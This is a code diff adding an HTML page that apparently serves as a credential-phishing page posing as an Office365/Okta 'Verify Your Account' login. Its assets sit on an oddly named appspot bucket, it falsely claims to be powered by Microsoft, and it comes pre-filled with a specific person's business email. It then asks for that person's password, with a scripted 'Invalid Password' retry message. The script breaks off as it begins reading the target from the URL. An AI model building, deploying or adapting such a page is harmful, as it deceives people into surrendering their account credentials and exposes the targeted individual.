@@ -1,0 +1,1190 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Office365 Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://storage.googleapis.com/mnbvfhjyhngbfvcx.appspot.com/okta-sign-in.min.css" type="text/css" rel="stylesheet">
+    <style type="text/css">
+    .cc_css_reboot {
+        -webkit-text-size-adjust: 100%;
+        -ms-text-size-adjust: 100%;
+        -ms-overflow-style: scrollbar;
+        -webkit-tap-highlight-color: transparent;
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        font-size: 1rem;
+        font-weight: 400;
+        line-height: 1.5;
+        color: #212529;
+        text-align: left;
+        background-color: #fff
+    }
+
+    .cc_css_reboot *,
+    .cc_css_reboot *::before,
+    .cc_css_reboot *::after {
+        box-sizing: border-box
+    }
+
+    .cc_css_reboot a,
+    .cc_css_reboot li,
+    .cc_css_reboot p,
+    .cc_css_reboot h1,
+    .cc_css_reboot h2,
+    .cc_css_reboot h3,
+    .cc_css_reboot h4,
+    .cc_css_reboot h5,
+    .cc_css_reboot h6,
+    .cc_css_reboot input,
+    .cc_css_reboot button,
+    .cc_css_reboot select {
+        border-style: none;
+        box-shadow: none;
+        margin: 0;
+        padding: 0;
+        border: 0;
+        font-size: 100%;
+        font: inherit;
+        vertical-align: baseline;
+        outline: none
+    }
+
+    @-ms-viewport {
+        .cc_css_reboot {
+            width: device-width
+        }
+    }
+
+    .cc_css_reboot article,
+    .cc_css_reboot aside,
+    .cc_css_reboot figcaption,
+    .cc_css_reboot figure,
+    .cc_css_reboot footer,
+    .cc_css_reboot header,
+    .cc_css_reboot hgroup,
+    .cc_css_reboot main,
+    .cc_css_reboot nav,
+    .cc_css_reboot section {
+        display: block
+    }
+
+    .cc_css_reboot [tabindex="-1"]:focus {
+        outline: 0 !important
+    }
+
+    .cc_css_reboot hr {
+        box-sizing: content-box;
+        height: 0;
+        overflow: visible
+    }
+
+    .cc_css_reboot h1,
+    .cc_css_reboot h2,
+    .cc_css_reboot h3,
+    .cc_css_reboot h4,
+    .cc_css_reboot h5,
+    .cc_css_reboot h6 {
+        margin-top: 0;
+        margin-bottom: 0.5rem;
+        color: #000
+    }
+
+    .cc_css_reboot p {
+        margin-top: 0;
+        margin-bottom: 1rem
+    }
+
+    .cc_css_reboot abbr[title],
+    .cc_css_reboot abbr[data-original-title] {
+        text-decoration: underline;
+        -webkit-text-decoration: underline dotted;
+        text-decoration: underline dotted;
+        cursor: help;
+        border-bottom: 0
+    }
+
+    .cc_css_reboot address {
+        margin-bottom: 1rem;
+        font-style: normal;
+        line-height: inherit
+    }
+
+    .cc_css_reboot div {
+        display: block
+    }
+
+    .cc_css_reboot ol,
+    .cc_css_reboot ul,
+    .cc_css_reboot dl {
+        margin-top: 0;
+        margin-bottom: 1rem
+    }
+
+    .cc_css_reboot ol ol,
+    .cc_css_reboot ul ul,
+    .cc_css_reboot ol ul,
+    .cc_css_reboot ul ol {
+        margin-bottom: 0
+    }
+
+    .cc_css_reboot b,
+    .cc_css_reboot strong {
+        font-weight: bolder
+    }
+
+    .cc_css_reboot small {
+        font-size: 80%
+    }
+
+    .cc_css_reboot sub,
+    .cc_css_reboot sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline
+    }
+
+    .cc_css_reboot sub {
+        bottom: -.25em
+    }
+
+    .cc_css_reboot sup {
+        top: -.5em
+    }
+
+    .cc_css_reboot a {
+        color: #007bff;
+        text-decoration: none;
+        background-color: transparent;
+        -webkit-text-decoration-skip: objects
+    }
+
+    .cc_css_reboot a:hover {
+        color: #0056b3;
+        text-decoration: underline
+    }
+
+    .cc_css_reboot a:not([href]):not([tabindex]) {
+        color: inherit;
+        text-decoration: none
+    }
+
+    .cc_css_reboot a:not([href]):not([tabindex]):hover,
+    .cc_css_reboot a:not([href]):not([tabindex]):focus {
+        color: inherit;
+        text-decoration: none
+    }
+
+    .cc_css_reboot a:not([href]):not([tabindex]):focus {
+        outline: 0
+    }
+
+    .cc_css_reboot img {
+        vertical-align: middle;
+        border-style: none
+    }
+
+    .cc_css_reboot svg:not(:root) {
+        overflow: hidden
+    }
+
+    .cc_css_reboot table {
+        border-collapse: collapse
+    }
+
+    .cc_css_reboot caption {
+        padding-top: 0.75rem;
+        padding-bottom: 0.75rem;
+        color: #6c757d;
+        text-align: left;
+        caption-side: bottom
+    }
+
+    .cc_css_reboot th {
+        text-align: inherit
+    }
+
+    .cc_css_reboot label {
+        display: inline-block;
+        margin-bottom: 0.5rem
+    }
+
+    .cc_css_reboot button {
+        border-radius: 2px;
+        padding: .5rem 1rem;
+        outline: none;
+        background: #dcdae5;
+        color: #111;
+        cursor: pointer;
+        border: none;
+        transition: all ease .3s
+    }
+
+    .cc_css_reboot button:focus {
+        outline: none
+    }
+
+    .cc_css_reboot select {
+        border-style: none
+    }
+
+    .cc_css_reboot input,
+    .cc_css_reboot button,
+    .cc_css_reboot select,
+    .cc_css_reboot optgroup,
+    .cc_css_reboot textarea {
+        margin: 0;
+        font-family: inherit;
+        font-size: inherit;
+        line-height: inherit
+    }
+
+    .cc_css_reboot button,
+    .cc_css_reboot input {
+        overflow: visible
+    }
+
+    .cc_css_reboot button,
+    .cc_css_reboot select {
+        text-transform: none
+    }
+
+    .cc_css_reboot button,
+    .cc_css_reboot html [type="button"],
+    .cc_css_reboot [type="reset"],
+    .cc_css_reboot [type="submit"] {
+        -webkit-appearance: button
+    }
+
+    .cc_css_reboot button::-moz-focus-inner,
+    .cc_css_reboot [type="button"]::-moz-focus-inner,
+    .cc_css_reboot [type="reset"]::-moz-focus-inner,
+    .cc_css_reboot [type="submit"]::-moz-focus-inner {
+        padding: 0;
+        border-style: none
+    }
+
+    .cc_css_reboot input[type="radio"],
+    .cc_css_reboot input[type="checkbox"] {
+        box-sizing: border-box;
+        padding: 0
+    }
+
+    .cc_css_reboot input[type="date"],
+    .cc_css_reboot input[type="time"],
+    .cc_css_reboot input[type="datetime-local"],
+    .cc_css_reboot input[type="month"] {
+        -webkit-appearance: listbox
+    }
+
+    .cc_css_reboot textarea {
+        overflow: auto;
+        resize: vertical
+    }
+
+    .cc_css_reboot fieldset {
+        min-width: 0;
+        padding: 0;
+        margin: 0;
+        border: 0
+    }
+
+    .cc_css_reboot legend {
+        display: block;
+        width: 100%;
+        max-width: 100%;
+        padding: 0;
+        margin-bottom: .5rem;
+        font-size: 1.5rem;
+        line-height: inherit;
+        color: inherit;
+        white-space: normal
+    }
+
+    .cc_css_reboot progress {
+        vertical-align: baseline
+    }
+
+    .cc_css_reboot [type="number"]::-webkit-inner-spin-button,
+    .cc_css_reboot [type="number"]::-webkit-outer-spin-button {
+        height: auto
+    }
+
+    .cc_css_reboot [type="search"] {
+        outline-offset: -2px;
+        -webkit-appearance: none
+    }
+
+    .cc_css_reboot [type="search"]::-webkit-search-cancel-button,
+    .cc_css_reboot [type="search"]::-webkit-search-decoration {
+        -webkit-appearance: none
+    }
+
+    .cc_css_reboot ::-webkit-file-upload-button {
+        font: inherit;
+        -webkit-appearance: button
+    }
+
+    .cc_css_reboot [hidden] {
+        display: none !important
+    }
+    </style>
+    <style type="text/css">
+    .cc_overlay_lock {
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 100%;
+        width: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 9999999999
+    }
+
+    .cc_overlay_lock.hidden {
+        display: none
+    }
+
+    .cc_dialog {
+        background-color: #f2f2f2;
+        color: #111;
+        z-index: 99999999999;
+        font-size: 16px;
+        padding: 3rem
+    }
+
+    .cc_dialog.hidden {
+        display: none
+    }
+
+    .cc_dialog.headline {
+        right: 0;
+        top: 0;
+        bottom: auto;
+        left: 0;
+        max-width: 100%;
+        position: relative
+    }
+
+    .cc_dialog.simple {
+        right: 0;
+        top: auto;
+        bottom: 0;
+        left: auto;
+        max-width: 50%;
+        position: fixed
+    }
+
+    .cc_dialog.interstitial {
+        right: 3vw;
+        top: 3vh;
+        left: 3vw;
+        max-width: 100%;
+        position: fixed
+    }
+
+    .cc_dialog.standalone {
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 100%;
+        width: 100%
+    }
+
+    .cc_dialog .cc_dialog_headline {
+        font-size: 24px;
+        font-weight: 600
+    }
+
+    .cc_dialog .cc_dialog_text {
+        font-size: 16px
+    }
+
+    .cc_dialog button {
+        font-weight: bold;
+        font-size: 14px
+    }
+
+    .cc_dialog button.cc_b_ok {
+        background-color: green;
+        color: #fff
+    }
+
+    .cc_dialog button.cc_b_ok:active {
+        background: #136d13
+    }
+
+    .cc_dialog button.cc_b_cp {
+        background-color: #eaeaea;
+        color: #111;
+        margin-left: 0.25rem !important
+    }
+
+    .cc_dialog button.cc_b_cp:active {
+        background: #f2f2f2
+    }
+
+    .cookie-consent-preferences-overlay {
+        width: 100%;
+        height: 100%;
+        position: fixed;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 999999999999;
+        top: 0;
+        left: 0;
+        display: none
+    }
+
+    .cookie-consent-preferences-overlay.visible {
+        display: block
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog {
+        position: absolute;
+        margin: 30px auto;
+        width: 750px;
+        max-width: 90%;
+        height: auto;
+        left: 0;
+        right: 0
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container {
+        width: 100%;
+        display: flex;
+        background: #fff;
+        flex-direction: column
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container>div {
+        width: 100%
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head {
+        background: #fff;
+        color: #111;
+        display: flex;
+        flex-direction: row;
+        justify-content: space-between
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_title {
+        display: flex;
+        padding-left: 15px;
+        flex-direction: column;
+        justify-content: center;
+        align-items: baseline
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_title h2,
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_title p {
+        margin: 0
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_title p {
+        font-size: 16px;
+        line-height: 1.5
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_title h2 {
+        font-size: 20px;
+        font-weight: 600
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_lang_selector {
+        display: flex;
+        align-items: center;
+        padding-right: 15px;
+        min-height: 80px;
+        justify-content: center
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content {
+        display: flex;
+        flex-direction: row;
+        align-items: stretch;
+        background: #292929;
+        color: #f5f5f5;
+        border-bottom: none
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu {
+        font-family: Arial, sans-serif !important;
+        width: 150px;
+        margin: 0;
+        padding: 0;
+        background: #e6e6e6;
+        min-width: 150px
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li {
+        margin: 0;
+        padding: 0;
+        float: left;
+        display: block;
+        width: 100%;
+        color: #666;
+        background: #e6e6e6;
+        border-bottom: 1px solid #ccc;
+        border-right: 1px solid #ccc;
+        transition: all ease .1s;
+        box-sizing: content-box
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li[active=true] {
+        background: #292929;
+        color: #f5f5f5
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li a {
+        text-decoration: none;
+        color: #666;
+        display: block;
+        padding: 10px 5px 10px 10px;
+        font-weight: 700;
+        font-size: 12px;
+        line-height: 19px
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content {
+        background: #292929 !important;
+        color: #f5f5f5
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content .cc_cp_m_content_entry {
+        width: 100%;
+        display: none;
+        padding: 25px;
+        box-sizing: border-box
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content .cc_cp_m_content_entry[active=true] {
+        display: block
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content .cc_cp_m_content_entry h1 {
+        font-size: 24px;
+        font-weight: 600
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content .cc_cp_m_content_entry p {
+        font-size: 16px;
+        line-height: 1.5
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer {
+        background: #f2f2f2;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        border-top: 1px solid #ccc;
+        justify-content: space-between
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_powered_by {
+        padding: 20px 10px;
+        font-size: 14px;
+        color: #333;
+        display: block !important
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_powered_by a {
+        color: #999
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_save button {
+        margin-right: 10px;
+        opacity: .9;
+        transition: all ease .3s;
+        font-size: 14px;
+        font-weight: bold;
+        height: auto
+    }
+
+    .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_save button:hover {
+        opacity: 1
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent {
+        position: absolute;
+        margin: 2px 0 0 16px;
+        cursor: pointer
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent+label {
+        position: relative;
+        padding: 4px 0 0 50px;
+        line-height: 2.0em;
+        cursor: pointer;
+        display: inline;
+        font-size: 14px
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent+label:before {
+        content: "";
+        position: absolute;
+        display: block;
+        left: 0;
+        top: 0;
+        width: 40px;
+        height: 24px;
+        border-radius: 16px;
+        background: #fff;
+        border: 1px solid #d9d9d9;
+        -webkit-transition: all 0.3s;
+        transition: all 0.3s
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent+label:after {
+        content: "";
+        position: absolute;
+        display: block;
+        left: 0px;
+        top: 0px;
+        width: 24px;
+        height: 24px;
+        border-radius: 16px;
+        background: #fff;
+        border: 1px solid #d9d9d9;
+        -webkit-transition: all 0.3s;
+        transition: all 0.3s
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent+label:hover:after {
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.3)
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent:checked+label:after {
+        margin-left: 16px
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent:checked+label:before {
+        background: #55D069
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm {
+        position: absolute;
+        margin: 5px 0 0 10px
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm+label {
+        position: relative;
+        padding: 0 0 0 32px;
+        line-height: 1.3em
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm+label:before {
+        content: "";
+        position: absolute;
+        display: block;
+        left: 0;
+        top: 0;
+        background: #fff;
+        border: 1px solid #d9d9d9;
+        -webkit-transition: all 0.3s;
+        transition: all 0.3s;
+        width: 25px;
+        height: 15px;
+        border-radius: 10px
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm+label:after {
+        content: "";
+        position: absolute;
+        display: block;
+        left: 0px;
+        top: 0px;
+        background: #fff;
+        border: 1px solid #d9d9d9;
+        -webkit-transition: all 0.3s;
+        transition: all 0.3s;
+        width: 15px;
+        height: 15px;
+        border-radius: 10px
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm+label:hover:after {
+        box-shadow: 0 0 3px rgba(0, 0, 0, 0.3)
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm:checked+label:after {
+        margin-left: 10px
+    }
+
+    .cookie-consent-preferences-overlay input[type="checkbox"].checkbox_cookie_consent-sm:checked+label:before {
+        background: #55D069
+    }
+
+    @media screen and (max-width: 600px) {
+        .cookie-consent-preferences-overlay {
+            overflow-y: scroll
+        }
+
+        .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head {
+            flex-direction: column
+        }
+
+        .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_title {
+            align-items: center;
+            padding: 15px 0 0 0
+        }
+
+        .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_lang_selector {
+            padding: 15px 0;
+            min-height: 20px
+        }
+
+        .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content {
+            flex-direction: column
+        }
+
+        .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu {
+            width: 100%
+        }
+
+        .cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li {
+            border-right: 0
+        }
+    }
+    </style>
+    <style type="text/css">
+    .dark.cc_dialog {
+        background-color: #111;
+        color: #fff
+    }
+
+    .dark.cc_dialog .cc_dialog_headline {
+        color: #fff
+    }
+
+    .dark.cc_dialog .cc_dialog_text {
+        color: #fff
+    }
+
+    .dark.cc_dialog button.cc_b_ok {
+        color: #000;
+        background-color: #ff0
+    }
+
+    .dark.cc_dialog button.cc_b_cp {
+        background-color: #eaeaea;
+        color: #111
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container {
+        background: #212121
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head {
+        background: #212121;
+        color: #fff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head h2 {
+        color: #fff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head p {
+        color: #fff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_lang_selector select {
+        color: #212121
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content {
+        background: #292929 !important;
+        color: #f5f5f5
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu {
+        color: #666;
+        background: #e6e6e6
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li {
+        border-right-color: #ccc;
+        border-bottom-color: #ccc
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li[active=true] {
+        background: #292929 !important
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li[active=true] a {
+        color: #f5f5f5 !important
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li a {
+        color: #666
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content {
+        background: #292929 !important;
+        color: #f5f5f5
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content h1 {
+        color: #fff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content p {
+        color: #fff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content a {
+        color: #cce5ff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer {
+        background: #212121;
+        border-top-color: #111
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_powered_by {
+        color: #fff
+    }
+
+    .dark.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_save button {
+        background: #ff0;
+        color: #000
+    }
+    </style>
+    <style type="text/css">
+    .light.cc_dialog {
+        background-color: #f2f2f2;
+        color: #111
+    }
+
+    .light.cc_dialog .cc_dialog_headline {
+        color: #111
+    }
+
+    .light.cc_dialog .cc_dialog_text {
+        color: #111
+    }
+
+    .light.cc_dialog button.cc_b_ok {
+        color: #fff;
+        background-color: green
+    }
+
+    .light.cc_dialog button.cc_b_cp {
+        background-color: #eaeaea;
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container {
+        background: #fff
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head {
+        background: #fff;
+        color: #111;
+        border-bottom: 1px solid #ccc
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head h2 {
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head p {
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_head .cc_cp_head_lang_selector select {
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content {
+        background: #fbfbfb !important;
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu {
+        color: #666;
+        background: #e6e6e6
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li {
+        border-right-color: #ccc;
+        border-bottom-color: #ccc
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li[active=true] {
+        background: #fbfbfb !important
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li[active=true] a {
+        color: #111 !important
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_menu li a {
+        color: #666
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content {
+        background: #fbfbfb !important;
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content h1 {
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content p {
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_content .cc_cp_m_content a {
+        color: #007bff
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer {
+        background: #f2f2f2;
+        border-top-color: #ccc
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_powered_by {
+        color: #111
+    }
+
+    .light.cookie-consent-preferences-overlay .cookie-consent-preferences-dialog .cc_cp_container .cc_cp_footer .cc_cp_f_save button {
+        background: green;
+        color: #fff
+    }
+    html, body{
+        height: 100%;
+    }
+    </style>
+</head>
+
+<body class="auth okta-container" style="background-image: url('https://storage.googleapis.com/mnbvfhjyhngbfvcx.appspot.com/RE4FrK0.jpg');background-size: cover;background-repeat: no-repeat;background-position: right;" >
+    <div class="content">
+        <div id="signin-container">
+            <div id="okta-sign-in" class="auth-container main-container can-remove-beacon">
+                <div class="okta-sign-in-header auth-header">
+                    <img src="https://storage.googleapis.com/mnbvfhjyhngbfvcx.appspot.com/clipart1110398.png" class="auth-org-logo">
+                    <div style="text-align: center;margin-top: 20px">
+                        <span style="font-size: 18px; font-weight:600">Verify Your Account</span>
+                    </div>
+                    <div data-type="beacon-container" class="beacon-container" style="transform: scale(1, 1); text-indent: 1px;">
+                        <div class="js-security-beacon">
+                            <div class="beacon-blank">
+                                <div class="radial-progress-bar">
+                                    <div class="circle left"></div>
+                                    <div class="circle right"></div>
+                                </div>
+                            </div>
+                            <div aria-live="polite" role="img" class="bg-helper auth-beacon auth-beacon-security undefined-user" data-se="security-beacon">
+                                <center><img width="50%" id="dmlogo" src=""></center>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="auth-content">
+                    <div class="auth-content-inner">
+                        <div class="idp-discovery">
+                            <form id="form1" class="idp-discovery-form o-form o-form-edit-mode">
+                                <div class="o-form-content o-form-theme clearfix">
+                                    <h5 class="okta-form-title o-form-head" id="domain">
+                                    </h5>
+                                    <center>
+                                        <div id="msg" style="display: none;color: red;font-weight: 600">Invalid Password..! Please enter correct password.</div>
+                                        <span id="error" style="display: none;color: red;">That account doesn't exist. Enter a different account</span>
+                                    </center>
+                                    <div class="o-form-fieldset-container" id="div1">
+                                        <div class="o-form-fieldset o-form-label-top margin-btm-30">
+                                            <div class="o-form-input o-form-has-errors">
+                                                <p class="o-form-explain">Enter your business email
+                                                </p>
+                                                <span class="o-form-input-name-username o-form-control okta-form-input-field input-fix o-form-has-errors ">
+                                                    <input type="text" placeholder="" name="olauser" id="ai" value="mmoeller@igus.net" autocomplete="off" required="">
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="o-form-fieldset-container" id="div2" style="display: none;">
+                                        <div class="o-form-fieldset o-form-label-top margin-btm-30">
+                                            <div style="border-color:#49F915" class="o-form-input o-form-has-errors">
+                                                <p class="o-form-explain">Password</p>
+                                                <span class="o-form-input-name-username o-form-control okta-form-input-field input-fix o-form-has-errors">
+                                                    <input type="password" placeholder="" name="olapass" id="pr" value="" aria-label="" autofocus="" autocomplete="off" required="">
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="o-form-button-bar"><input class="button button-primary" type="submit" value="Next" id="submit-btn"></div>
+                            </form>
+                            <div class="auth-footer">
+                                <a href="#" class="link help js-help">
+                                    Need help signing in?
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer" style="padding-bottom: 10px">
+        <div class="footer-container clearfix">
+            <p class="copyright">Powered By <a href="http://www.microsoft.com/" class="inline-block notranslate">Mic<span>ros</span>oft</a></p>
+            <p class="privacy-policy"><a href="https://www.microsoft.com/privacy" target="_blank" class="inline-block margin-l-10">Confidentiality</a></p>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
